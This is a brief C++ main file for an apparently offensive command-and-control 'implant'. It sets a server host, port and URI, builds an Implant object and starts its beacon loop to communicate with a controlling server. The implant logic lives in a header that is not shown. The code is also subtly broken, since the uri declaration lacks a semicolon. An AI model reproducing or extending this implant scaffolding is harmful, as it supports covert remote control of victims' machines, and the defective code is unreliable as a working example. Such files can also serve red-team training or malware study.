#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"

#include <stdio.h>

#include <boost/system/system_error.hpp>

int main(){
    //specify address, port, and URI of server endpoints
    const auto host = "localhost";
    const auto port = 5000 ;
    const auto uri = "/" //--> holds the response from the implant
    
    // Instantiate our implant object
    Implant implant{ host, port, uri }; 
    // Call the beacon method to start beaconing loop
    try {
        implant.beacon(); //begins communication with server
    }
    catch (const boost::system::system_error& se) {
        printf("\nSystem error: %s\n", se.what());
    }
}